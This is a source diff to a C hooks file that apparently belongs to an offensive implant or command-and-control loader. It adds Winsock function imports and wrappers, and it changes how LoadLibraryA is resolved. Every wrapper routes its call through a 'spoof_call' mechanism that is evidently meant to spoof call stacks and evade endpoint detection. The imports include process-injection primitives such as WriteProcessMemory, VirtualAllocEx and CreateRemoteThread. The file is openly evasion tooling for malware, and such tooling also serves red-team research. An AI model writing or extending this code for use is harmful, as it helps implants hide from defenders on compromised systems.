@@ -1,3 +1,5 @@
+#include <winsock2.h>
+#include <ws2tcpip.h>
 #include <windows.h>
 #include <winldap.h>
 #include <wininet.h>
@@ -6,41 +8,46 @@
 #include "memory.h"
 #include "spoof.h"
 
-DECLSPEC_IMPORT HINTERNET WINAPI WININET$InternetConnectA ( HINTERNET, LPCSTR, INTERNET_PORT, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR );
-DECLSPEC_IMPORT HINTERNET WINAPI WININET$InternetOpenA    ( LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD );
-
-DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CloseHandle           ( HANDLE );
-DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileMappingA    ( HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR );
-DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CreateProcessA        ( LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION );
-DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateRemoteThread    ( HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD );
-DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateThread          ( LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD );
-DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$DuplicateHandle       ( HANDLE, HANDLE, HANDLE, LPHANDLE, DWORD, BOOL, DWORD );
-DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$GetThreadContext      ( HANDLE, LPCONTEXT );
-DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$MapViewOfFile         ( HANDLE, DWORD, DWORD, DWORD, SIZE_T );
-DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$OpenProcess           ( DWORD, BOOL, DWORD );
-DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$OpenThread            ( DWORD, BOOL, DWORD );
-DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$ReadProcessMemory     ( HANDLE, LPCVOID, LPVOID, SIZE_T, SIZE_T * );
-DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$ResumeThread          ( HANDLE );
-DECLSPEC_IMPORT VOID   WINAPI KERNEL32$RtlCaptureContext     ( PCONTEXT );
-DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$SetThreadContext      ( HANDLE, const CONTEXT * );
-DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$UnmapViewOfFile       ( LPCVOID );
-DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$VirtualAlloc          ( LPVOID, SIZE_T, DWORD, DWORD );
-DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$VirtualAllocEx        ( HANDLE, LPVOID, SIZE_T, DWORD, DWORD );
-DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$VirtualFree           ( LPVOID, SIZE_T, DWORD );
-DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$VirtualProtect        ( LPVOID, SIZE_T, DWORD, PDWORD );
-DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$VirtualProtectEx      ( HANDLE, LPVOID, SIZE_T, DWORD, PDWORD );
-DECLSPEC_IMPORT SIZE_T WINAPI KERNEL32$VirtualQuery          ( LPCVOID, PMEMORY_BASIC_INFORMATION, SIZE_T );
-DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$WriteProcessMemory    ( HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T * );
-
-DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoCreateInstance ( REFCLSID, LPUNKNOWN, DWORD, REFIID, LPVOID * );
-
-DECLSPEC_IMPORT ULONG  NTAPI  NTDLL$NtContinue ( CONTEXT *, BOOLEAN );
+DECLSPEC_IMPORT HINTERNET WINAPI WININET$InternetConnectA    ( HINTERNET, LPCSTR, INTERNET_PORT, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR );
+DECLSPEC_IMPORT HINTERNET WINAPI WININET$InternetOpenA       ( LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD );
+DECLSPEC_IMPORT BOOL      WINAPI KERNEL32$CloseHandle        ( HANDLE );
+DECLSPEC_IMPORT HANDLE    WINAPI KERNEL32$CreateFileMappingA ( HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR );
+DECLSPEC_IMPORT BOOL      WINAPI KERNEL32$CreateProcessA     ( LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION );
+DECLSPEC_IMPORT HANDLE    WINAPI KERNEL32$CreateRemoteThread ( HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD );
+DECLSPEC_IMPORT HANDLE    WINAPI KERNEL32$CreateThread       ( LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD );
+DECLSPEC_IMPORT BOOL      WINAPI KERNEL32$DuplicateHandle    ( HANDLE, HANDLE, HANDLE, LPHANDLE, DWORD, BOOL, DWORD );
+DECLSPEC_IMPORT BOOL      WINAPI KERNEL32$GetThreadContext   ( HANDLE, LPCONTEXT );
+DECLSPEC_IMPORT HMODULE   WINAPI KERNEL32$LoadLibraryA       ( LPCSTR );
+DECLSPEC_IMPORT LPVOID    WINAPI KERNEL32$MapViewOfFile      ( HANDLE, DWORD, DWORD, DWORD, SIZE_T );
+DECLSPEC_IMPORT HANDLE    WINAPI KERNEL32$OpenProcess        ( DWORD, BOOL, DWORD );
+DECLSPEC_IMPORT HANDLE    WINAPI KERNEL32$OpenThread         ( DWORD, BOOL, DWORD );
+DECLSPEC_IMPORT BOOL      WINAPI KERNEL32$ReadProcessMemory  ( HANDLE, LPCVOID, LPVOID, SIZE_T, SIZE_T * );
+DECLSPEC_IMPORT DWORD     WINAPI KERNEL32$ResumeThread       ( HANDLE );
+DECLSPEC_IMPORT VOID      WINAPI KERNEL32$RtlCaptureContext  ( PCONTEXT );
+DECLSPEC_IMPORT BOOL      WINAPI KERNEL32$SetThreadContext   ( HANDLE, const CONTEXT * );
+DECLSPEC_IMPORT BOOL      WINAPI KERNEL32$UnmapViewOfFile    ( LPCVOID );
+DECLSPEC_IMPORT LPVOID    WINAPI KERNEL32$VirtualAlloc       ( LPVOID, SIZE_T, DWORD, DWORD );
+DECLSPEC_IMPORT LPVOID    WINAPI KERNEL32$VirtualAllocEx     ( HANDLE, LPVOID, SIZE_T, DWORD, DWORD );
+DECLSPEC_IMPORT BOOL      WINAPI KERNEL32$VirtualFree        ( LPVOID, SIZE_T, DWORD );
+DECLSPEC_IMPORT BOOL      WINAPI KERNEL32$VirtualProtect     ( LPVOID, SIZE_T, DWORD, PDWORD );
+DECLSPEC_IMPORT BOOL      WINAPI KERNEL32$VirtualProtectEx   ( HANDLE, LPVOID, SIZE_T, DWORD, PDWORD );
+DECLSPEC_IMPORT SIZE_T    WINAPI KERNEL32$VirtualQuery       ( LPCVOID, PMEMORY_BASIC_INFORMATION, SIZE_T );
+DECLSPEC_IMPORT BOOL      WINAPI KERNEL32$WriteProcessMemory ( HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T * );
+DECLSPEC_IMPORT HRESULT   WINAPI OLE32$CoCreateInstance      ( REFCLSID, LPUNKNOWN, DWORD, REFIID, LPVOID * );
+DECLSPEC_IMPORT ULONG     NTAPI  NTDLL$NtContinue            ( CONTEXT *, BOOLEAN );
 
 DECLSPEC_IMPORT ULONG LDAPAPI WLDAP32$ldap_bind_s ( LDAP *, const PSTR, const PCHAR, ULONG );
 
-// cannot put this here because it fails to build
-// to PIC when hooks.x64.o is merged into the loader
-// extern MEMORY_LAYOUT g_memory;
+DECLSPEC_IMPORT int       WSAAPI WS2_32$bind ( SOCKET, const struct sockaddr *, int );
+DECLSPEC_IMPORT int       WSAAPI WS2_32$closesocket ( SOCKET );
+DECLSPEC_IMPORT int       WSAAPI WS2_32$connect ( SOCKET, const struct sockaddr *, int );
+DECLSPEC_IMPORT int       WSAAPI WS2_32$getaddrinfo ( const char *, const char *, const struct addrinfo *, struct addrinfo ** );
+DECLSPEC_IMPORT int       WSAAPI WS2_32$ioctlsocket ( SOCKET, long, u_long * );
+DECLSPEC_IMPORT int       WSAAPI WS2_32$listen ( SOCKET, int );
+DECLSPEC_IMPORT int       WSAAPI WS2_32$select ( int, fd_set *, fd_set *, fd_set *, const struct timeval * );
+DECLSPEC_IMPORT int       WSAAPI WS2_32$send ( SOCKET, const char *, int, int );
+DECLSPEC_IMPORT SOCKET    WSAAPI WS2_32$socket ( int, int, int );
+DECLSPEC_IMPORT unsigned long WSAAPI WSOCK32$inet_addr ( const char * );
 
 HINTERNET WINAPI _InternetOpenA ( LPCSTR lpszAgent, DWORD dwAccessType, LPCSTR lpszProxy, LPCSTR lpszProxyBypass, DWORD dwFlags )
 {
@@ -198,7 +205,7 @@ HMODULE WINAPI _LoadLibraryA ( LPCSTR lpLibFileName )
 {
     FUNCTION_CALL call = { 0 };
 
-    call.ptr  = ( PVOID ) ( LoadLibraryA );
+    call.ptr  = ( PVOID ) ( KERNEL32$LoadLibraryA );
     call.argc = 1;
     
     call.args [ 0 ] = spoof_arg ( lpLibFileName );
@@ -434,4 +441,134 @@ ULONG LDAPAPI _ldap_bind_s ( LDAP * ld, const PSTR dn, const PCHAR cred, ULONG m
     call.args [ 3 ] = spoof_arg ( method );
 
     return ( ULONG ) spoof_call ( &call );
+}
+
+// WS2_32 and WSOCK32 hooks
+int WSAAPI _bind ( SOCKET s, const struct sockaddr * name, int namelen )
+{
+    FUNCTION_CALL call = { 0 };
+
+    call.ptr        = ( PVOID ) ( WS2_32$bind );
+    call.argc       = 3;
+    call.args [ 0 ] = spoof_arg ( s );
+    call.args [ 1 ] = spoof_arg ( name );
+    call.args [ 2 ] = spoof_arg ( namelen );
+
+    return ( int ) spoof_call ( &call );
+}
+
+int WSAAPI _closesocket ( SOCKET s )
+{
+    FUNCTION_CALL call = { 0 };
+
+    call.ptr        = ( PVOID ) ( WS2_32$closesocket );
+    call.argc       = 1;
+    call.args [ 0 ] = spoof_arg ( s );
+
+    return ( int ) spoof_call ( &call );
+}
+
+int WSAAPI _listen ( SOCKET s, int backlog )
+{
+    FUNCTION_CALL call = { 0 };
+
+    call.ptr        = ( PVOID ) ( WS2_32$listen );
+    call.argc       = 2;
+    call.args [ 0 ] = spoof_arg ( s );
+    call.args [ 1 ] = spoof_arg ( backlog );
+
+    return ( int ) spoof_call ( &call );
+}
+
+int WSAAPI _send ( SOCKET s, const char * buf, int len, int flags )
+{
+    FUNCTION_CALL call = { 0 };
+
+    call.ptr        = ( PVOID ) ( WS2_32$send );
+    call.argc       = 4;
+    call.args [ 0 ] = spoof_arg ( s );
+    call.args [ 1 ] = spoof_arg ( buf );
+    call.args [ 2 ] = spoof_arg ( len );
+    call.args [ 3 ] = spoof_arg ( flags );
+
+    return ( int ) spoof_call ( &call );
+}
+
+SOCKET WSAAPI _socket ( int af, int type, int protocol )
+{
+    FUNCTION_CALL call = { 0 };
+
+    call.ptr        = ( PVOID ) ( WS2_32$socket );
+    call.argc       = 3;
+    call.args [ 0 ] = spoof_arg ( af );
+    call.args [ 1 ] = spoof_arg ( type );
+    call.args [ 2 ] = spoof_arg ( protocol );
+
+    return ( SOCKET ) spoof_call ( &call );
+}
+
+unsigned long WSAAPI _inet_addr ( const char * cp )
+{
+    FUNCTION_CALL call = { 0 };
+
+    call.ptr        = ( PVOID ) ( WSOCK32$inet_addr );
+    call.argc       = 1;
+    call.args [ 0 ] = spoof_arg ( cp );
+
+    return ( unsigned long ) spoof_call ( &call );
+}
+
+int WSAAPI _connect ( SOCKET s, const struct sockaddr * name, int namelen )
+{
+    FUNCTION_CALL call = { 0 };
+
+    call.ptr        = ( PVOID ) ( WS2_32$connect );
+    call.argc       = 3;
+    call.args [ 0 ] = spoof_arg ( s );
+    call.args [ 1 ] = spoof_arg ( name );
+    call.args [ 2 ] = spoof_arg ( namelen );
+
+    return ( int ) spoof_call ( &call );
+}
+
+int WSAAPI _getaddrinfo ( const char * nodename, const char * servname, const struct addrinfo * hints, struct addrinfo ** res )
+{
+    FUNCTION_CALL call = { 0 };
+
+    call.ptr        = ( PVOID ) ( WS2_32$getaddrinfo );
+    call.argc       = 4;
+    call.args [ 0 ] = spoof_arg ( nodename );
+    call.args [ 1 ] = spoof_arg ( servname );
+    call.args [ 2 ] = spoof_arg ( hints );
+    call.args [ 3 ] = spoof_arg ( res );
+
+    return ( int ) spoof_call ( &call );
+}
+
+int WSAAPI _ioctlsocket ( SOCKET s, long cmd, u_long * argp )
+{
+    FUNCTION_CALL call = { 0 };
+
+    call.ptr        = ( PVOID ) ( WS2_32$ioctlsocket );
+    call.argc       = 3;
+    call.args [ 0 ] = spoof_arg ( s );
+    call.args [ 1 ] = spoof_arg ( cmd );
+    call.args [ 2 ] = spoof_arg ( argp );
+
+    return ( int ) spoof_call ( &call );
+}
+
+int WSAAPI _select ( int nfds, fd_set * readfds, fd_set * writefds, fd_set * exceptfds, const struct timeval * timeout )
+{
+    FUNCTION_CALL call = { 0 };
+
+    call.ptr        = ( PVOID ) ( WS2_32$select );
+    call.argc       = 5;
+    call.args [ 0 ] = spoof_arg ( nfds );
+    call.args [ 1 ] = spoof_arg ( readfds );
+    call.args [ 2 ] = spoof_arg ( writefds );
+    call.args [ 3 ] = spoof_arg ( exceptfds );
+    call.args [ 4 ] = spoof_arg ( timeout );
+
+    return ( int ) spoof_call ( &call );
 }
